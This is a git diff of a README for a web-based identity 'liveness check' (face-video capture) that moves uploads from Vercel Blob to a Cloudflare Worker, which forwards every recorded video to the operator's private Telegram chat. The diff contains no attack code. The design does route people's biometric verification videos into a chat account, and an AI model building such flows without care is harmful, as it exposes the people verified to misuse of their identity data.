@@ -1,58 +1,87 @@
-# Liveness Check — Vercel Deployment
+# Liveness Check — Vercel + Cloudflare Worker → Telegram
 
-A single-page identity-verification flow (consent + on-device gesture detection + video capture) deployable as a Vercel project. Video is uploaded directly from the browser to **Vercel Blob**.
+A single-page identity-verification flow (consent + on-device gesture detection
++ video capture). The verification UI is served from Vercel; the recorded
+video is uploaded — at full quality — to a tiny Cloudflare Worker that
+forwards it to your Telegram chat via Bot API.
 
-## Architecture
+## Why two providers?
+
+Vercel serverless functions cap request bodies at **4.5 MB**, which forces
+either a heavily compressed clip or an external storage hop. Cloudflare
+Workers accept up to **100 MB on the free plan**, so we keep the recording
+at 1280×720 @ 4 Mbps and stream it straight through.
 
 ```
-Browser  ──(1)──▶  /api/upload          (Vercel Function)
-   │                  ↓ issues a short-lived signed token
-   │  ◀─(2)─── token
-   │
-   ├──(3)─── PUT video bytes ──▶  Vercel Blob (storage)
-   │
-   ◀──(4)─── upload-completed callback ──▶ /api/upload
+Browser  ──(1)──▶  Cloudflare Worker
+   │  (raw video bytes, up to ~30 MB)        │
+   │                                          │ multipart sendVideo
+   │                                          ▼
+   │                                  Telegram Bot API
+   │                                          │
+   │                                          ▼
+   │                                  Your private chat  📥
+   ◀──(2)──  { ok: true }
 ```
 
-The browser never streams the video through the function (Vercel's per-request body limit is 4.5 MB). Instead it uploads directly to Blob, which keeps quality intact end-to-end.
+Vercel just hosts the static page (`public/`) — no functions, no storage.
 
-## Deployment
+## Setup
 
-### 1. Push the repo to GitHub / GitLab
+### 1. Create a Telegram bot
+
+1. Open Telegram, message `@BotFather`, send `/newbot`, follow the prompts.
+2. Copy the bot token (e.g. `123456789:AAH...`).
+3. Start a chat with your new bot (search its username, press Start).
+4. Get your numeric chat id — easiest way: message `@userinfobot` and copy the
+   `Id` it replies with. (For a private channel, forward a message from the
+   channel to `@RawDataBot` and look for `forward_from_chat.id`.)
+
+### 2. Deploy the Cloudflare Worker
 
 ```sh
-git init && git add . && git commit -m "init"
-git remote add origin git@github.com:you/liveness.git && git push -u origin main
+cd worker
+npm install
+npx wrangler login                       # browser sign-in to Cloudflare
+npx wrangler secret put TELEGRAM_BOT_TOKEN
+npx wrangler secret put TELEGRAM_CHAT_ID
+npx wrangler deploy
 ```
 
-### 2. Import into Vercel
+Copy the URL `wrangler deploy` prints — looks like
+`https://liveness-telegram-bridge.<your-subdomain>.workers.dev`.
 
-1. Vercel dashboard → **Add New → Project** → import the repo.
-2. Framework preset: **Other**. Build / output settings: leave default (Vercel detects the static `public/` and `api/` folders automatically).
-3. Click **Deploy**.
+### 3. Tell the page where the Worker lives
 
-### 3. Connect a Blob store
+In `public/index.html`, set the meta tag:
 
-1. In your new project → **Storage** tab → **Create Database** → **Blob**.
-2. Choose a name (e.g. `liveness-videos`) and create.
-3. Vercel auto-injects `BLOB_READ_WRITE_TOKEN` into the project's env. No code change needed.
-4. Redeploy (Deployments → ⋯ → Redeploy) so the function picks up the env.
+```html
+<meta name="liveness-api" content="https://liveness-telegram-bridge.<your-subdomain>.workers.dev/">
+```
 
-### 4. (Recommended) Set `ALLOWED_ORIGINS`
+### 4. Deploy the page to Vercel
 
-Project → **Settings → Environment Variables** → add:
+```sh
+git add . && git commit -m "configure worker URL"
+git push                                # triggers Vercel deploy
+```
 
-| Name | Value |
-|---|---|
-| `ALLOWED_ORIGINS` | `https://yoursite.com,https://www.yoursite.com` |
+Or use the Vercel dashboard — **Add New → Project** → import the repo. No
+environment variables needed on Vercel.
 
-This restricts which sites can trigger uploads.
+### 5. (Recommended) Lock the Worker to your domain
 
-That's it — the verification page is live at `https://<your-project>.vercel.app`.
+After Vercel gives you a URL, edit `worker/wrangler.toml`:
+
+```toml
+[vars]
+ALLOWED_ORIGIN = "https://your-project.vercel.app"
+```
+
+Then `cd worker && npx wrangler deploy` again. The Worker will reject CORS
+preflights from any other origin.
 
 ## Using it from your existing site
-
-In any page on `yoursite.com`:
 
 ```html
 <iframe
@@ -71,8 +100,7 @@ In any page on `yoursite.com`:
     if (msg?.source !== 'liveness-check') return;
 
     if (msg.type === 'success') {
-      // msg.file  → blob pathname  (use as ID)
-      // msg.url   → blob public URL
+      // msg.file → filename that was forwarded to Telegram
       console.log('verified', msg);
     }
     if (msg.type === 'resize') iframe.style.height = (msg.height + 4) + 'px';
@@ -80,44 +108,59 @@ In any page on `yoursite.com`:
 </script>
 ```
 
-The full message protocol is documented in [public/host.html](public/host.html).
-
-## Custom domain
-
-In Vercel: Project → **Domains** → add e.g. `verify.yoursite.com`. Then update the `<iframe src>` and the `e.origin` check above to use that host.
+The full message protocol is in [public/host.html](public/host.html).
 
 ## Local development
 
+Static page (Vercel):
+
 ```sh
 npm install
-cp .env.local.example .env.local
-# get BLOB_READ_WRITE_TOKEN from Vercel dashboard → Storage → Blob → .env.local tab
-npx vercel link        # link this folder to the Vercel project
-npx vercel env pull    # pulls envs into .env.local automatically (alternative to step above)
-npm run dev            # runs `vercel dev` → http://localhost:3000
+npm run dev                      # http://localhost:3000
 ```
 
-`vercel dev` runs the API functions and serves `public/` exactly as in production. Uploads go to the real Blob store (linked via the token).
+Worker (Cloudflare):
+
+```sh
+cd worker
+npm install
+npx wrangler dev                 # http://localhost:8787
+```
+
+While developing locally, point the meta tag at `http://localhost:8787` and
+the page at `http://localhost:3000` will hit your local Worker.
+
+## Limits & trade-offs
+
+| | |
+|---|---|
+| **Capture quality** | 1280×720 @ 4 Mbps. No compression hop — Telegram receives exactly what the camera produced. |
+| **Max recording duration** | 60 s. After that the session fails with a clear message. At 4 Mbps that's ~30 MB, well under Telegram's 50 MB cap. |
+| **Max upload size** | 45 MB (client-side check). Telegram Bot API caps `sendVideo` at 50 MB. |
+| **Worker request size** | 100 MB on Cloudflare free plan, 500 MB on paid. |
+| **Failover** | If Telegram rejects `sendVideo` (rare; usually container-related), the Worker retries with `sendDocument` so the bytes still reach you. |
+| **No retention** | Bytes pass through the Worker and are not stored. Telegram is the only persistent copy. |
 
 ## Security checklist before production
 
 | | |
 |---|---|
-| **HTTPS** | ✅ automatic on Vercel. Required by `getUserMedia`. |
-| **`ALLOWED_ORIGINS`** | Set to your real origins. Empty = allow all. |
+| **HTTPS** | ✅ automatic on Vercel and Workers. Required by `getUserMedia`. |
+| **`ALLOWED_ORIGIN`** | Set in `worker/wrangler.toml` to your real origin. Empty = allow all. |
 | **Origin check in parent** | Verify `event.origin` against the iframe's URL before trusting `success` messages — see snippet above. |
 | **Tighten `postToParent` target** | In [public/app.js](public/app.js), replace `'*'` with your parent site's origin. |
-| **Authorize uploads** | The `onBeforeGenerateToken` hook in [api/upload.js](api/upload.js) is currently open. Add session/JWT validation here — throw to deny. |
-| **Blob privacy** | Files are `access: 'public'` with un-guessable random suffixes. URLs are not listed, but anyone with the URL can read. Don't leak the URL to untrusted parties. For stricter privacy, swap to S3/R2 with signed URLs. |
-| **Persist references** | The current `onUploadCompleted` only logs. Store the blob URL in your DB if you need to look the video up later. |
+| **Bot token secrecy** | Treat `TELEGRAM_BOT_TOKEN` like a password — never commit it. The Worker stores it as a secret, not in code. |
+| **Authorize requests** | The Worker currently accepts any POST from an allowed origin. Add session/JWT validation before forwarding if the page is public. |
 
 ## File map
 
 | | |
 |---|---|
-| `api/upload.js` | Vercel Function — issues Blob upload tokens, receives completion callbacks. |
-| `public/index.html` | The verification UI (Arabic, RTL). |
-| `public/app.js` | Gesture detection (MediaPipe) + capture (MediaRecorder) + client upload (@vercel/blob/client). Embed mode auto-detected. |
+| `public/index.html` | The verification UI (Arabic, RTL). Holds the `<meta name="liveness-api">` Worker URL. |
+| `public/app.js` | Gesture detection (MediaPipe) + capture (MediaRecorder) + upload via XHR. Embed mode auto-detected. |
 | `public/styles.css` | Dark theme. |
 | `public/host.html` | Demo of how a parent page embeds the iframe and listens for messages. |
+| `worker/src/index.js` | The Cloudflare Worker — receives the video and forwards it to Telegram. |
+| `worker/wrangler.toml` | Worker config (name, vars). |
+| `worker/README.md` | Worker-specific deployment notes. |
 | `vercel.json` | `Permissions-Policy: camera=(self)`, clean URLs. |
